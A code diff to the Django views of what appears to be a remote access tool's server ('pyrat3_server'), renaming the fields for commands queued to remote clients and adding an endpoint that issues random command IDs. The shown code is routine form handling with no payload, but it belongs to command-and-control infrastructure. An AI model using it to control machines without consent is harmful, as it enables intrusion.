@@ -30,7 +30,7 @@ from ast import literal_eval
 from django.http import HttpResponse
 
 
-def get_unique_id(size=6, chars=string.ascii_uppercase + string.digits):
+def new_command_id(size=6, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
 
 
@@ -38,7 +38,7 @@ class Index(generic.edit.FormView):
 
     template_name = 'pyrat3_server/index.html'
     form_class = ClientSendCommandForm
-    initial = {'last_command_id': get_unique_id}
+    initial = {'command_id': new_command_id}
     #success_url = 'index'
 
     def post(self, request, *args, **kwargs):
@@ -53,10 +53,10 @@ class Index(generic.edit.FormView):
                 #print(type(client_id))
                 #client = form.save(commit=False)
                 client = Client.objects.get(client_id=client_id)
-                client.last_command_id = form.cleaned_data['last_command_id']
-                client.last_command = form.cleaned_data['last_command']
-                client.last_command_datetime = datetime.now(tz=pytz.utc)
-                client.last_command_args = form.cleaned_data['last_command_args']
+                client.command_id = form.cleaned_data['command_id']
+                client.command = form.cleaned_data['command']
+                client.command_datetime = datetime.now(tz=pytz.utc)
+                client.command_args = form.cleaned_data['command_args']
                 client.save()
             return self.form_valid(form)
         else:
@@ -70,6 +70,13 @@ class Index(generic.edit.FormView):
     def form_invalid(self, form):
         """If the form is invalid, render the invalid form."""
         return JsonResponse({'form_valid': False}, status=400)
+
+
+def generate_command_id(request):
+
+    command_id = new_command_id()
+
+    return JsonResponse({'command_id': command_id})
 
 
 class ClientTable(generic.ListView):
